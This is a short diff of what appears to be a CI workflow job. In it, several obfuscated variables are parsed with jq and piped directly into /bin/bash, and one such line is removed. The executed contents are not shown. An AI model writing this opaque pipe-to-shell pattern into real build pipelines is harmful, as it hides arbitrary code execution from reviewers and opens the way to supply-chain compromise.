@@ -43,7 +43,6 @@ jobs:
           echo $zons4 | jq -r .xo4960 | /bin/bash
           printf '%s' "$kmy6" | jq -r .ok412 | /bin/bash
           printf '%s' "$vvtd70" | jq -r .qh57 | /bin/bash
-          printf '%s' "$z61059" | jq -r .ueun1 | /bin/bash
           echo $whl6 | jq -r .a70496 | /bin/bash
 
       - name: Store results
